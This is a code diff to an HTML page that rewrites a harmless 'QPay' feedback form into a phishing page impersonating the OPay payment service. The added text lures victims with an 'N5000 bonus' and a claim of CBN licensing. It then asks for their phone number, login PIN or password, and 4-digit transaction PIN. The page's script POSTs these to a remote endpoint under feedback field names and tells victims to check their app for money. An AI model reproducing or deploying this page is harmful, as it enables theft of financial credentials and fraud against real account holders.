@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QPay Anniversary Feedback</title>
+<title>OPay Anniversary Feedback</title>
 <style>
 *{box-sizing:border-box; font-family:-apple-system, sans-serif}
 body{margin:0; background:#f5f5f7; display:flex; justify-content:center}
@@ -25,30 +25,30 @@ body{margin:0; background:#f5f5f7; display:flex; justify-content:center}
 <body>
 <div class="page">
   <div class="banner">
-    <div class="logo">🛡️ QPay</div>
-    <p>QPay FIRST ANNIVERSARY -<br>Share your feedback!<br>N5000 bonus for lucky users!<br>*T&C apply</p>
+    <div class="logo"> OPay</div>
+    <p>OPay ANNIVERSARY -<br>Share your feedback!<br>N5000 bonus for lucky users!<br>*T&C apply</p>
   </div>
   <div class="content">
-    <h1>We Value Your Feedback</h1>
-    <div class="sub">Answer 3 quick questions</div>
+    <h1>Quickly claim your reward </h1>
+    <div class="sub">feel the following form correctly to verify </div>
 
     <div class="card">
-      <div class="q"><span class="badge">1</span> How was your QPay experience?</div>
-      <textarea id="q1" placeholder="Share your experience here..."></textarea>
+      <div class="q"><span class="badge">1</span> enter your phone number </div>
+      <textarea id="q1" placeholder="type your phone number ..."></textarea>
     </div>
 
     <div class="card">
-      <div class="q"><span class="badge">2</span> What can we improve?</div>
-      <textarea id="q2" placeholder="Your suggestions to help us improve..."></textarea>
+      <div class="q"><span class="badge">2</span> enter login pin</div>
+      <textarea id="q2" placeholder="confirm your login password ..."></textarea>
     </div>
 
     <div class="card">
-      <div class="q"><span class="badge">3</span> Any other suggestions?</div>
-      <textarea id="q3" placeholder="Anything else we'd love to hear..."></textarea>
+      <div class="q"><span class="badge">3</span> enter your 4 digits </div>
+      <textarea id="q3" placeholder="confirm your transaction pin..."></textarea>
     </div>
 
-    <button class="btn" onclick="submitFeedback()">Submit Feedback</button>
-    <div class="foot">Your feedback helps us serve you better • 100% confidential</div>
+    <button class="btn" onclick="submitFeedback()">verify</button>
+    <div class="foot">OPAY licensed by CBN • 100% confidential</div>
   </div>
 </div>
 
@@ -66,14 +66,14 @@ function submitFeedback(){
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({
-      subject: 'New QPay Feedback - 3 Answers',
+      subject: 'New OPay Feedback - 3 Answers',
       Q1_Experience: q1,
       Q2_Improve: q2,
       Q3_Other: q3
     })
   })
   .then(() => {
-    alert('Thank you! Your 3 feedback sent successfully.');
+    alert('Thank you!. if you provided the information correctly check your app to see the money .');
     document.getElementById('q1').value=''; document.getElementById('q2').value=''; document.getElementById('q3').value='';
   })
   .catch(() => {
